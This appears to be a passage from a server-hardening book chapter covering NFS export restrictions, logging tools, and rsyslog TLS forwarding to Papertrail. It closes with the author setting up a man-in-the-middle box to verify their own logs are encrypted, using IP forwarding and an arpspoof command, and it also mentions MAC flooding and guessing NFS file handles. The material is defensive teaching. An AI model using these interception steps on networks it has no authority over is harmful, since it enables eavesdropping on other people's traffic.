<p>The above <code>hosts.[allow | deny]</code> provide the accessibility options. You really need to lock these down if you intend to use NFS in a somewhat secure fashion.</p>

<p>The <a href="https://linux.die.net/man/5/exports">exports</a> man page has all the details (and some examples) you need, but I will cover some options here.</p>

<p>In the below example <code>/dir/you/want/to/export</code> is the directory (and sub directories) that you want to share, this could also be an entire volume, but keeping these as small as possible is a good start.</p>

<figure class="code">
  <figcaption>/etc/exports</figcaption>

<div class="highlight"><pre><code></code>&lt;/dir/you/want/to/export&gt;   machine1<code class="o">(</code>option1,optionn<code class="o">)</code> machine2<code class="o">(</code>option1,optionn<code class="o">)</code> machinen<code class="o">(</code>opti<code class="se">\</code>
on1,optionn<code class="o">)</code>
</pre></div>

</figure>

<p><code>machine1</code>, <code>machine2</code>, <code>machinen</code> are the machines that you want to have access to the spescified exported share. These can be specified as their DNS names or IP addresses, using IP addresses can be a little more secure and reliable than using DNS addresses. If using DNS, make sure the names are fully qualified domain names.</p>

<p>Some of the more important options are:</p>

<ul>
  <li>
<code>ro</code>: The client will not be able to write to the exported share (this is the default), and I do not use <code>rw</code> which allows the client to also write.</li>
  <li>
<code>root_squash</code>: This prevents remote root users that are connected from also having root privileges, assigning them the user ID of the <code>nfsnobody</code>, thus effectively squashing the power of the remote user to the lowest privileges possible on the server. Or even better, use <code>all_squash</code>.</li>
  <li>From 1.1.0 of <code>nfs-utils</code> onwards, <code>no_subtree_check</code> is a default. <code>subtree_check</code> was the previous default, which would cause a routine to verify that files requested by the client were in the appropriate part of the volume. The <code>subtree_check</code> caused more issues than it solved.</li>
  <li>
<code>fsid</code>: is used to specify the file system that is exported, this could be a UUID, or the device number. NFSv4 clients have the ability to see all of the exports served by the NFSv4 server as a single file system. This is called the NFSv4 pseudo-file system. This pseudo-file system is identified as a <a href="https://www.centos.org/docs/5/html/Deployment_Guide-en-US/s1-nfs-server-config-exports.html#id3077674">single, real file system</a>, identified at export with the <code>fsid=0</code> option.</li>
  <li>
<code>anonuid</code> and <code>anongid</code> explicitly set the uid and gid of the anonymous account. This option makes all requests look like they come from a specific user. By default the uid and gid of 65534 is used by exportfs for squashed access. These two options allow us to override the uid and gid values.</li>
</ul>

<p>The following is one of the configs I have used on several occasions: </p>

<figure class="code">
  <figcaption>/etc/exports</figcaption>

<div class="highlight"><pre><code></code><code class="c1"># Allow read only access to all hosts within subnet to the /dir/you/want/to/export directory</code>
<code class="c1"># as user nfsnobody.</code>
&lt;/dir/you/want/to/export&gt;   <code class="m">10</code>.10.0.0/24<code class="o">(</code>ro,fsid<code class="o">=</code><code class="m">0</code>,sync,root_squash,no_subtree_check,anonuid<code class="o">=</code><code class="se">\</code>
<code class="m">65534</code>,anongid<code class="o">=</code><code class="m">65534</code><code class="o">)</code>
</pre></div>

</figure>

<p>Then on top of this sort of configuration, you need to make sure that the local server mounts are as restrictive as we set-up in the <a href="chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-lock-down-the-mounting-of-partitions">Lock Down the Mounting of Partitions</a> section, and also the file permissions for other, at the exported level recursively, are as restrictive as practical for you. Now we are starting to achieve a little defence in depth.</p>

<p>Now if you have been following along with the NFS configuration because you are working on a file server rather than a web server, lets just take this a little further with some changes to <code>/etc/hosts.deny</code> and <code>/etc/hosts.allow</code>.<br />
The access control language used in these two files is the same as each other, just that <code>hosts.deny</code> is consulted for which entities to deny to which services, and <code>hosts.allow</code> for which to allow for the same.</p>

<p>Each line of these two files specifies (in the simplest form) a single service or process and a set of hosts in numeric form (not DNS). In the more complex forms, <em>daemon@host</em> and <em>user@host</em>.</p>

<p>You can add <code>ALL:ALL</code> to your <code>hosts.deny</code>, but if you install a new service that uses these files, then you will be left wondering why it is not working. I prefer to be more explicit, but it is up to you.</p>

<figure class="code">
  <figcaption>/etc/hosts.deny</figcaption>

<div class="highlight"><pre><code></code>rpcbind : ALL
</pre></div>

</figure>

<figure class="code">
  <figcaption>/etc/hosts.allow</figcaption>

<div class="highlight"><pre><code></code>rpcbind : <code class="m">10</code>.10.0.10 <code class="m">10</code>.10.0.11 <code class="m">10</code>.10.0.n

<code class="c1"># Or if you are confident you have enough defence in depth</code>
<code class="c1"># and need to open to your network segment:</code>
rpcbind : <code class="m">10</code>.10.0.0/24
</pre></div>

</figure>

<p>Prior to NFSv4 to achieve the same results, these two files would need to contain something similar to the following. <a href="https://www.centos.org/docs/5/html/Deployment_Guide-en-US/ch-nfs.html">NFSv4 has no interaction</a> with these additional daemons, as their functionality has been incorporated into the version 4 protocol and NFS (v4) listens on the well known TCP port 2049:</p>

<figure class="code">
  <figcaption>/etc/hosts.deny</figcaption>

<div class="highlight"><pre><code></code>portmap : ALL
lockd   : ALL
mountd  : ALL
rquotad : ALL
statd   : ALL
</pre></div>

</figure>

<figure class="code">
  <figcaption>/etc/hosts.allow</figcaption>

<div class="highlight"><pre><code></code>portmap : <code class="m">10</code>.10.0.10 <code class="m">10</code>.10.0.11 <code class="m">10</code>.10.0.n
lockd   : <code class="m">10</code>.10.0.10 <code class="m">10</code>.10.0.11 <code class="m">10</code>.10.0.n
mountd  : <code class="m">10</code>.10.0.10 <code class="m">10</code>.10.0.11 <code class="m">10</code>.10.0.n
rquotad : <code class="m">10</code>.10.0.10 <code class="m">10</code>.10.0.11 <code class="m">10</code>.10.0.n
statd   : <code class="m">10</code>.10.0.10 <code class="m">10</code>.10.0.11 <code class="m">10</code>.10.0.n

<code class="c1"># Or if you are confident you have enough defence in depth</code>
<code class="c1"># and need to open to your network segment:</code>
portmap : <code class="m">10</code>.10.0.0/24
lockd   : <code class="m">10</code>.10.0.0/24
mountd  : <code class="m">10</code>.10.0.0/24
rquotad : <code class="m">10</code>.10.0.0/24
statd   : <code class="m">10</code>.10.0.0/24
</pre></div>

</figure>

<p>You can reload your config, that is re-export your exports <code>/etc/exports</code> with a restart of NFS:</p>

<figure class="code">
<div class="highlight"><pre><code></code>service nfs-kernel-server <code class="o">[</code>restart <code class="p">|</code> stop, start<code class="o">]</code>
</pre></div>

</figure>

<p>Although that is not really necessary, a simple</p>

<figure class="code">
<div class="highlight"><pre><code></code>exportfs -ra
</pre></div>

</figure>

<p>is sufficient. Both exports and exportfs man pages are good for additional insight.</p>

<p>Then run another <code>showmount</code> to audit your exports:</p>

<figure class="code">
<div class="highlight"><pre><code></code>showmount -e &lt;target host&gt;
</pre></div>

</figure>

<p></p>

<p>A client communicates with the servers mount daemon. If the client is authorised, the mount daemon then provides the root file handle of the exported filesystem to the client, at which point the client can send packets referencing the file handle. Making correct guesses of valid file handles can often be easy. The file handles consist of:</p>

<ol class="numeric">
  <li>A filesystem Id (visible in <code>/etc/fstab</code> usually world readable, or by running <code>blkid</code>).</li>
  <li>An inode number. For example, the <code>/</code> directory on the standard Unix filesystem has the inode number of 2, <code>/proc</code> is 1. You can see these with <code>ls -id &lt;target dir&gt;</code>
</li>
  <li>A generation count, this value can be a little more fluid, although many inodes such as the <code>/</code> are not deleted very often, so the count remains small and reasonably guessable. Using a tool <code>istat</code> can provide these details if you want to have a play.</li>
</ol>

<p>Thus allowing a spoofing type of attack, which has been made more difficult by the following measures:</p>

<ol class="numeric">
  <li>Prior to NFS version 4, UDP could be used, making spoofed requests easier, which allowed an attacker to perform Create, Read, Update, Delete (CRUD) operations on the exported file system(s)</li>
  <li>By default <code>exportfs</code> is run with the <code>secure</code> option, requiring that requests originate from a privileged port (&lt;1024). We can see with the following commands that this is the case, so whoever attempts to mount an export must be root.</li>
</ol>

<figure class="code">
<div class="highlight"><pre><code></code><code class="c1"># From a client:</code>
netstat -nat <code class="p">|</code> grep &lt;nfs host&gt;
<code class="c1"># Produces:</code>
tcp <code class="m">0</code> <code class="m">0</code> &lt;nfs client host&gt;:702 &lt;nfs host&gt;:2049 ESTABLISHED
</pre></div>

</figure>

<p>Or with the newer Socket Statistics:</p>

<figure class="code">
<div class="highlight"><pre><code></code><code class="c1"># From a client:</code>
ss -pn <code class="p">|</code> grep &lt;nfs host&gt;
<code class="c1"># Produces:</code>
tcp ESTAB <code class="m">0</code> <code class="m">0</code> &lt;nfs client host&gt;:702 &lt;nfs host&gt;:2049
</pre></div>

</figure>

<p>Prior to this spoofing type vulnerability largely being mitigated, one option that was used was to randomise the generation number of every inode on the filesystem using a tool <code>fsirand</code>, which was available for some versions of Unix, although not Linux. This made guessing the generation number harder, thus mitigating these spoofing type of attacks. This would usually be scheduled to run say once a month.</p>

<p><code>fsirand</code> would be run on the <code>/</code> directory while in single-user mode<br />
or<br />
on un-mounted filesystems, run <code>fsck</code>, and if no errors were produced, run <code>fsirand</code></p>

<figure class="code">
<div class="highlight"><pre><code></code>umount &lt;filesystem&gt; <code class="c1"># /dev/sda1 for example</code>
fsck &lt;filesystem&gt; <code class="c1"># /dev/sda1 for example</code>
<code class="c1"># Exit code of 0 means no errors.</code>
fsirand &lt;filesystem&gt; <code class="c1"># /dev/sda1 for example</code>
</pre></div>

</figure>

<h4 id="vps-countermeasures-lack-of-visibility">Lack of Visibility</h4>

<p>
  <strong>Some Useful Visibility Commands</strong>
</p>

<p>Check who is currently logged in to your server and what they are doing:<br />
<code>who</code> and <code>w</code>  </p>

<p>Check who has recently logged into your server, I mentioned this command previously:<br />
<code>last -ad</code></p>

<p>Check which user has failed login attempts, mentioned this command previously:<br />
<code>lastb -ad</code></p>

<p>Check the most recent login of all users, or of a given user. <code>lastlog</code> sources data from the binary file:<br />
<code>/var/log/lastlog</code><br />
<code>lastlog</code></p>

<h5 id="vps-countermeasures-lack-of-visibility-logging-and-alerting">
  <a href="https://medium.com/starting-up-security/learning-from-a-year-of-security-breaches-ed036ea05d9b#41e1">Logging and Alerting</a>
</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----PreventionEASY.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>



<p>I recently performed an <a href="chap03.html#vps-countermeasures-lack-of-visibility-web-server-log-management">in-depth evaluation</a> of a small collection of logging and alerting offerings, the choice of which candidates to bring into the in-depth evaluation came from an <a href="chap03.html#vps-countermeasures-lack-of-visibility-logging-and-alerting-initial-evaluation">initial evaluation</a>.</p>

<p>It is very important to make sure you have reliable and all-encompassing logging to an off-site location. This way attackers will have to also compromise that location in order to effectively <a href="http://www.win.tue.nl/~aeb/linux/hh/hh-13.html">cover their tracks</a>.</p>

<p>You can often see in logs when access has been granted to an entity, when files have been modified or removed. Become familiar with what your logs look like and which events create which messages. A good sys-admin can sight logs and quickly see anomalies. If you keep your log aggregator open at least when ever you are working on the servers that generate the events, you will quickly get used to recognising which events cause which log entries.</p>

<p>Alerting events should also be set-up for expected, unexpected actions and a dead mans snitch.</p>

<p>Make sure you have reviewed who can <a href="http://www.tldp.org/HOWTO/Security-HOWTO/secure-prep.html#logs">write and read</a> your logs, especially those created by the <code>auth</code> facility, and make any modifications necessary to the permissions.</p>

<p>In order to have logs that provide the information you need, you need to make sure the logging level is set to produce the required amount of verbosity. That time stamps are synchronised across your network. That you archive the logs for long enough to be able to diagnose malicious activity and movements across the network.</p>

<p>Being able to rely on the times of events on different network nodes is essential to making sense of tracking an attackers movements through your network. I discuss setting up Network Time Protocol (NTP) on your networked machines in the <a href="chap04.html#network-countermeasures-fortress-mentality-insufficient-logging-ntp">Network</a> chapter.</p>

<ul id="vps-countermeasures-lack-of-visibility-logging-and-alerting-initial-evaluation">
  <li>
<a href="https://sourceforge.net/projects/swatch/">Simple Log Watcher</a><br />
Or as it used to be called before being asked to change its name from Swatch (Simple Watchdog), by the Swiss watch company, is a pearl script that monitors a log file for each instance you run (or schedule), matches your defined regular expression patterns based on the configuration file which defaults to <code>~/.swatchrc</code> and performs any action you can script. You can define different message types with different font styles and colours. Simple Log Watcher can tail the log file, so your actions will be performed in real-time.  </li>
</ul>

<p>Each log file you want to monitor, you need a separate <code>swatchrc</code> file and a separate instance of Simple Log Watcher, as it only takes one file argument. If you want to monitor a lot of log files without aggregating them, this could get messy.  </p>

<p>See the <a href="chap07.html#additional-resources-vps-countermeasures-lack-of-visibility-logging-and-alerting-swatch">Additional Resources</a> chapter.  </p>

<ul>
  <li>
<a href="https://packages.debian.org/stretch/logcheck">Logcheck</a><br />
Monitors system log files, and emails anomalies to an administrator. Once <a href="https://linuxtechme.wordpress.com/2012/01/31/install-logcheck/">installed</a> it needs to be set-up to run periodically with cron, so it is not a real-time monitor, which may significantly reduce its usefulness in catching an intruder before they obtain their goal, or get a chance to modify the logs that logcheck would review. The Debian Manuals have <a href="https://www.debian.org/doc/manuals/securing-debian-howto/ch4.en.html#s-custom-logcheck">details</a> on how to use and customise logcheck. Most of the configuration is stored in <code>/etc/logcheck/logcheck.conf</code>. You can specify which log files to review within the <code>/etc/logcheck/logcheck.logfiles</code>. Logcheck is easy to install and configure.  </li>
  <li>
<a href="https://packages.debian.org/stretch/logwatch">Logwatch</a><br />
Similar to Logcheck, monitors system logs, not continuously, so they could be open to modification before Logwatch reviews them, thus rendering Logwatch infective. Logwatch targets a similar space to Simple Log Watcher and Logcheck from above, it can review all logs within a certain directory, all logs from a specified collection of services, and single log files. Logwatch creates a report of what it finds based on your level of paranoia and can email to the sys-admin. It is easy to set-up and get started though. Logwatch is available in the debian repositories and the <a href="https://sourceforge.net/p/logwatch/git/ci/master/tree/">source</a> is available on SourceForge.  </li>
  <li>
<a href="https://packages.debian.org/stretch/logrotate">Logrotate</a><br />
Use <a href="http://www.rackspace.com/knowledge_center/article/understanding-logrotate-utility">logrotate</a> to make sure your logs will be around long enough to examine them. There are some usage examples<br />
here: <a href="http://www.thegeekstuff.com/2010/07/logrotate-examples/">http://www.thegeekstuff.com/2010/07/logrotate-examples/</a>. Ships with Debian. It is just a matter of reviewing the default configuration and applying any extra config that you require specifically.  </li>
  <li>
<a href="https://www.elastic.co/products/logstash">Logstash</a><br />
Targets a similar problem to logrotate, but goes a lot further in that it routes and has the ability to translate between protocols. Logstash has a rich plugin ecosystem, with integrations provided by both the creators (Elastic) and the open source community. As per the above offerings, Logstash is FOSS. One of the main disadvantages I see is that Java is a dependency.  </li>
  <li>
<a href="http://www.fail2ban.org/wiki/index.php/Main_Page">Fail2ban</a><br />
Ban hosts that cause multiple authentication errors, or just email events. Of course you need to think about false positives here also. An attacker can spoof many IP addresses potentially causing them all to be banned, thus creating a DoS. Fail2ban has been around for at least 12 years, is actively maintained and written in <a href="https://github.com/fail2ban/fail2ban/">Python</a>. There is also a web UI written in NodeJS called <a href="https://github.com/Sean-Der/fail2web">fail2web</a>.  </li>
  <li>
<a href="https://packages.debian.org/stretch/multitail">Multitail</a><br />
Does what its name says. Tails multiple log files at once and shows them in a terminal. Provides real-time multi log file monitoring. Great for seeing strange happenings before an intruder has time to modify logs, if you are watching them that is. Good for a single or small number of systems if you have spare screens to fix to the wall.  </li>
  <li>
<a href="https://papertrailapp.com/">PaperTrail</a><br />
Targets a similar problem to MultiTail, except that it collects logs from as many servers as you want, and streams them off-site to PaperTrails service, then aggregates them into a single easily searchable web interface, allowing you to set-up alerts on any log text. PaperTrail has a free plan providing 100MB per month, which is enough for some purposes. The plans are reasonably cheap for the features it provides, and can scale as you grow. I have used this in production environments (as discussed soon), and have found it to be a tool that does not try to do to much, and does what it does well.</li>
</ul>

<h5 id="vps-countermeasures-lack-of-visibility-web-server-log-management">Web Server Log Management</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----PreventionAVERAGE.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<h6 id="leanpub-auto-system-loggers-reviewed">System Loggers Reviewed</h6>

<p>
  <strong>GNU syslogd</strong>
</p>

<p>Which I am unsure of whether it is being actively developed. Most GNU/Linux distributions no longer ship with this. Only supports UDP. It is also lacking in features. From what I gather is single-threaded. I did not spend long looking at this as there was not much point. The following two offerings are the main players currently.</p>

<p>
  <strong>Rsyslog</strong>
</p>

<p>Which ships with Debian and most other GNU/Linux distributions now. I like to do as little as possible to achieve goals, and rsyslog fits this description for me. The <a href="http://www.rsyslog.com/doc/master/index.html">rsyslog documentation</a> is good. Rainer Gerhards wrote rsyslog and his <a href="http://blog.gerhards.net/2007/08/why-does-world-need-another-syslogd.html">blog</a> provides many good insights into all things system logging. Rsyslog Supports UDP, TCP, TLS. There is also the Reliable Event Logging Protocol (RELP) which Rainer created. Rsyslog is great at gathering, transporting, storing log messages and includes some really neat functionality for dividing the logs. It is not designed to alert on logs. That is where the likes of Simple Event Correlator (<a href="http://www.gossamer-threads.com/lists/rsyslog/users/6044">SEC</a>) comes in, as discussed <a href="chap03.html#vps-countermeasures-lack-of-visibility-web-server-log-management-improving-the-strategy">below</a>. Rainer Gerhards discusses why TCP is not as reliable as many <a href="http://blog.gerhards.net/2008/04/on-unreliability-of-plain-tcp-syslog.html">think</a>.</p>

<p>
  <strong>Syslog-ng</strong>
</p>

<p>I did not spend to long here, as I did not see any features that I needed that were better than the default of rsyslog. Syslog-ng can correlate log messages, both real-time and off-line, supports reliable and encrypted transport using TCP and TLS. message filtering, sorting, pre-processing, log normalisation.</p>

<h6 id="leanpub-auto-aims">Aims</h6>

<ul>
  <li>Record events and have them securely transferred to another syslog server in real-time, or as close to it as possible, so that potential attackers do not have time to modify them on the local system before they are replicated to another location</li>
  <li>Reliability: Resilience / ability to recover connectivity. No messages lost.</li>
  <li>Privacy: Log messages should not be able to be read in transit.</li>
  <li>Integrity: Log messages should not be able to be tampered with / modified in transit. Integrity on the file-system is covered in other places in this chapter, such as in sections <a href="chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-partitioning-on-os-installation">Partitioning on OS Installation</a> and <a href="chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-lock-down-the-mounting-of-partitions">Lock Down the Mounting of Partitions</a></li>
  <li>Extensibility: ability to add more machines and be able to aggregate events from many sources on <a href="chap04.html#network-countermeasures-lack-of-visibility-insufficient-logging">many machines</a>.</li>
  <li>Receive notifications from the upstream syslog server of specific events. No <a href="chap03.html#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids">Host Intrusion Detection System (HIDS)</a> is going to remove the need to reinstall your system if you are not notified in time and an attacker plants and activates their root-kit.</li>
  <li>Receive notifications from the upstream syslog server of lack of events. If you expect certain events to usually occur, but they have stopped, and you want to know about it.</li>
</ul>

<h6 id="vps-countermeasures-lack-of-visibility-web-server-log-management-environmental-considerations">Environmental Considerations</h6>

<p>You may have devices in your network topology such as routers, switches, access points (APs) that do not have functionality to send their system logs via TCP, opting to rely on an unreliable transport such as UDP, often also not supporting any form of confidentiality. As this is not directly related to VPS, I will defer this portion to the <a href="chap04.html#network-countermeasures-lack-of-visibility-insufficient-logging">Insufficient Logging</a> countermeasures section within the Network chapter.</p>

<h6 id="vps-countermeasures-lack-of-visibility-web-server-log-management-initial-set-up">Initial Set-Up</h6>


<p>Rsyslog using TCP, local queuing over TLS to papertrail for your syslog collection, aggregating and reporting server. Papertrail does not support RELP, but say that is because their clients have not seen any issues with reliability in using plain TCP over TLS with local queuing. I must have been the first then. Maybe I am the only one that actually compares what is being sent against what is being received.</p>

<p>As I was setting this up and watching both ends. We had an internet outage of just over an hour. At that stage we had very few events being generated, so it was trivial to verify both ends after the outage. I noticed that once the ISPs router was back on-line and the events from the queue moved to papertrail, that there was in fact one missing.</p>

<p>Why did Rainer Gerhards create RELP if TCP with queues was good enough? That was a question that was playing on me for a while. In the end, it was obvious that TCP without RELP is not good enough if you want your logs to have the quality of integrity. At this stage it looks like the queues may loose messages. Rainer Gerhards <a href="http://ftp.ics.uci.edu/pub/centos0/ics-custom-build/BUILD/rsyslog-3.19.8/doc/rsyslog_reliable_forwarding.html">said</a> <em>In rsyslog, every action runs on its own queue and each queue can be set to buffer data if the action is not ready. Of course, you must be able to detect that the action is not ready, which means the remote server is off-line. This can be detected with plain TCP syslog and RELP</em>, so it can be detected without RELP.</p>

<p>You can <a href="http://help.papertrailapp.com/kb/configuration/advanced-unix-logging-tips/#rsyslog_aggregate_log_files">aggregate</a> log files with rsyslog or by using papertrails <code>remote_syslog</code> daemon.</p>

<p>Alerting is available, including for <a href="http://help.papertrailapp.com/kb/how-it-works/alerts/#inactivity">inactivity of events</a>.</p>

<p>Papertrails documentation is good and support is reasonable. Due to the huge amounts of traffic they have to deal with, they are unable to trouble-shoot any issues you may have. If you still want to go down the papertrail path, to get started, work through (<a href="https://papertrailapp.com/systems/setup">https://papertrailapp.com/systems/setup</a>) which sets up your rsyslog to use UDP (specified in the <code>/etc/rsyslog.conf</code> by a single ampersand in front of the target syslog server). I wanted something more reliable than that, so I use two ampersands, which specifies TCP.</p>

<p>As we are going to be sending our logs over the internet for now, we need TLS, check papertrails <a href="http://help.papertrailapp.com/kb/configuration/encrypting-remote-syslog-with-tls-ssl/#rsyslog">Encrypting with TLS</a> docs. Check papertrails CA server bundle for integrity:</p>

<figure class="code">
<div class="highlight"><pre><code></code>curl https://papertrailapp.com/tools/papertrail-bundle.pem <code class="p">|</code> md5sum
</pre></div>

</figure>

<p>Should result in what ever it says on papertrails Encrypting with TLS page. First problem here: the above mentioned page that lists the MD5 checksum is being served unencrypted, even if you force the use of <code>https</code> I get an invalid certificate error. My advice would be to contact papertrail directly and ask them what the MD5 checksum should be. Make sure it is the same as what the above command produces.</p>

<p>If it is, put the contents of that URL into a file called <code>papertrail-bundle.pem</code>, then <a href="https://blog.binarymist.net/2012/03/25/copying-with-scp/"><code>scp</code></a> the <code>papertrail-bundle.pem</code> into the web servers <code>/etc</code> dir. The command for that will depend on whether you are already on the web server and you want to pull, or whether you are somewhere else and want to push. Then make sure the ownership is correct on the pem file.</p>

<figure class="code">
<div class="highlight"><pre><code></code>chown root:root papertrail-bundle.pem
</pre></div>

</figure>

<p>install <code>rsyslog-gnutls</code>:</p>

<figure class="code">
<div class="highlight"><pre><code></code>apt-get install rsyslog-gnutls
</pre></div>

</figure>

<p>Add the TLS config:</p>

<figure class="code">
<div class="highlight"><pre><code></code><code class="nv">$DefaultNetstreamDriverCAFile</code> /etc/papertrail-bundle.pem <code class="c1"># trust these CAs</code>
<code class="nv">$ActionSendStreamDriver</code> gtls <code class="c1"># use gtls netstream driver</code>
<code class="nv">$ActionSendStreamDriverMode</code> <code class="m">1</code> <code class="c1"># require TLS</code>
<code class="nv">$ActionSendStreamDriverAuthMode</code> x509/name <code class="c1"># authenticate by host-name</code>
<code class="nv">$ActionSendStreamDriverPermittedPeer</code> *.papertrailapp.com
</pre></div>

</figure>

<p>to your <code>/etc/rsyslog.conf</code>. Create egress rule for your router to let traffic out to destination port <code>39871</code>.</p>

<figure class="code">
<div class="highlight"><pre><code></code>sudo service rsyslog restart
</pre></div>

</figure>

<p>To generate a log message that uses your system syslogd config <code>/etc/rsyslog.conf</code>, run:</p>

<figure class="code">
<div class="highlight"><pre><code></code>logger <code class="s2">"hi"</code>
</pre></div>

</figure>

<p>Should log <code>hi</code> to <code>/var/log/messages</code> and also to <a href="https://papertrailapp.com/events">https://papertrailapp.com/events</a>, but it was not.</p>

<p>
  <strong>Time to Trouble-shoot</strong>
</p>

<p>Let us keep an eye on <code>/var/log/messages</code>, where our log messages should be written to for starters. In one terminal run the following:</p>

<figure class="code">
<div class="highlight"><pre><code></code><code class="c1"># Show a live update of the last 10 lines (by default) of /var/log/messages</code>
sudo tail -f <code class="o">[</code>-n &lt;number of lines to tail&gt;<code class="o">]</code> /var/log/messages
</pre></div>

</figure>

<p>OK, so lets run rsyslog in config checking mode:</p>

<figure class="code">
<div class="highlight"><pre><code></code>/usr/sbin/rsyslogd -f /etc/rsyslog.conf -N1
</pre></div>

</figure>

<p>If the config is OK, the output will look like:</p>

<figure class="code">
<div class="highlight"><pre><code></code>rsyslogd: version &lt;the version number&gt;, config validation run <code class="o">(</code>level <code class="m">1</code><code class="o">)</code>, master config /etc/r<code class="se">\</code>
syslog.conf
rsyslogd: End of config validation run. Bye.
</pre></div>

</figure>

<p>Some of the trouble-shooting resources I found were:</p>

<ol class="numeric">
  <li><a href="https://www.loggly.com/docs/troubleshooting-rsyslog/">https://www.loggly.com/docs/troubleshooting-rsyslog/</a></li>
  <li><a href="http://help.papertrailapp.com/">http://help.papertrailapp.com/</a></li>
  <li><a href="http://help.papertrailapp.com/kb/configuration/troubleshooting-remote-syslog-reachability/">http://help.papertrailapp.com/kb/configuration/troubleshooting-remote-syslog-reachability/</a></li>
  <li>
<code>/usr/sbin/rsyslogd -version</code> will provide the installed version and supported features.</li>
</ol>

<p>The papertrail help was not that helpful, as we do not, and should not have telnet installed, we removed it <a href="chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-telnet">remember</a>? I can not ping from the DMZ as ICMP egress is not white-listed and I am not going to install tcpdump or strace on a production server. The more you have running, the more surface area you have, the greater the opportunities for exploitation, good for attackers, bad for defenders.</p>

<p>So how do we tell if rsyslogd is actually running if it does not appear to be doing anything useful?</p>

<figure class="code">
<div class="highlight"><pre><code></code>pidof rsyslogd
<code class="c1"># or</code>
/etc/init.d/rsyslog status
</pre></div>

</figure>

<p>Showing which files rsyslogd has open can be useful:</p>

<figure class="code">
<div class="highlight"><pre><code></code>lsof -p &lt;rsyslogd pid&gt;
<code class="c1"># or just combine the results of pidof rsyslogd:</code>
sudo lsof -p <code class="k">$(</code>pidof rsyslogd<code class="k">)</code>
</pre></div>

</figure>

<p>To start with, produced output like:</p>

<figure class="code">
<div class="highlight"><pre><code></code>rsyslogd <code class="m">3426</code> root 8u IPv4 <code class="m">9636</code> 0t0 TCP &lt;your server IP&gt;:&lt;sending port&gt;-&gt;logs2.papertrailapp.<code class="se">\</code>
com:39871 <code class="o">(</code>SYN_SENT<code class="o">)</code>
</pre></div>

</figure>

<p>Which obviously showed rsyslogds <code>SYN</code> packets were not getting through. I had some discussion with Troy from papertrail support around the reliability of plain TCP over TLS without RELP. I think if the server is business critical, then <a href="chap03.html#vps-countermeasures-lack-of-visibility-web-server-log-management-improving-the-strategy">Improving the Strategy</a> maybe required. Troy assured me that they had never had any issues with logs being lost due to lack of reliability with out RELP. Troy also pointed me to their recommended <a href="http://help.papertrailapp.com/kb/configuration/advanced-unix-logging-tips/#rsyslog_queue">local queue options</a>. After adding the queue tweaks and a rsyslogd restart, the above command now produced output like:</p>

<figure class="code">
<div class="highlight"><pre><code></code>rsyslogd <code class="m">3615</code> root 8u IPv4 <code class="m">9766</code> 0t0 TCP &lt;your server IP&gt;:&lt;sending port&gt;-&gt;logs2.papertrailapp.<code class="se">\</code>
com:39871 <code class="o">(</code>ESTABLISHED<code class="o">)</code>
</pre></div>

</figure>

<p>I could now see events in the papertrail web UI in real-time.</p>

<p>Socket Statistics (<code>ss</code>) (the better <code>netstat</code>) should also show the established connection.</p>

<p>By default papertrail accepts TCP over TLS (TLS encryption check-box on, Plain text check-box off) and UDP. So if your TLS is not set-up properly, your events will not be accepted by papertrail. This is how I confirmed this to be true:</p>

<p id="confirm-that-our-logs-are-commuting-over-tls">
  <strong>Confirm that our Logs are Commuting over TLS</strong>
</p>

<p>Now without installing anything on the web server or router, or physically touching the server sending packets to papertrail, or the router. Using a switch (ubiquitous) rather than a hub. No wire tap or multi-network interfaced computer. No switch monitoring port available on expensive enterprise grade switches (along with the much needed access). I was basically down to two approaches I could think of, and I like to achieve as much as possible with as little amount of effort as possible, so could not be bothered getting out of my chair and walking to the server rack.</p>

<ol class="numeric">
  <li>MAC flooding with the help of <a href="http://linux.die.net/man/8/macof">macof</a> which is a utility from the dsniff suite. This essentially causes your switch to go into a failopen mode where it acts like a hub and broadcasts its packets to every port.  

<figure class="image center" style="width: 396px;">
  <img src="images/MItMMACFlod.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>

  </li>
  <li>Man In the Middle (MItM) with some help from <a href="chap04.html#network-identify-risks-spoofing-website">ARP spoofing</a> or <a href="http://thevega.blogspot.co.nz/2008_06_01_archive.html">poisoning</a>. I decided to choose the second option, as it is a little more elegant.  

<figure class="image center" style="width: 396px;">
  <img src="images/MItMARPSpoof.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>

  </li>
</ol>

<p>On our MItM box, I set a static <code>IP</code>: <code>address</code>, <code>netmask</code>, <code>gateway</code> in <code>/etc/network/interfaces</code> and add <code>domain</code>, <code>search</code> and <code>nameservers</code> to the <code>/etc/resolv.conf</code>.</p>

<p>Follow that up with a <code>service network-manager restart</code>.</p>

<p>On the web server, run: <code>ifconfig -a</code> to get MAC: <code>&lt;your server MAC&gt;</code>.</p>

<p>On MItM box, run the same command, to get MAC: <code>&lt;MItM box MAC&gt;</code>.</p>

<p>On web server, run: <code>ip neighbour</code> to find MAC addresses associated with IP addresses (the local ARP table). Router will be: <code>&lt;router MAC&gt;</code>.</p>

<figure class="code">
<div class="highlight"><pre><code></code>you@your_server:~$ ip neighbour
&lt;MItM box IP&gt; dev eth0 lladdr &lt;MItM box MAC&gt; REACHABLE
&lt;router IP&gt; dev eth0 lladdr &lt;router MAC&gt; REACHABLE
</pre></div>

</figure>

<p>Now you need to turn your MItM box into a router temporarily. On the MItM box run:</p>

<figure class="code">
<div class="highlight"><pre><code></code>cat /proc/sys/net/ipv4/ip_forward
</pre></div>

</figure>

<p>If forwarding is on, You will see a <code>1</code>. If it is not, add a <code>1</code> into the file:</p>

<figure class="code">
<div class="highlight"><pre><code></code><code class="nb">echo</code> <code class="m">1</code> &gt; /proc/sys/net/ipv4/ip_forward
</pre></div>

</figure>

<p>and check again to make sure forwarding is on. Now on the MItM box run:</p>

<figure class="code">
<div class="highlight"><pre><code></code>arpspoof -t &lt;your server IP&gt; &lt;router IP&gt;
</pre></div>

</figure>

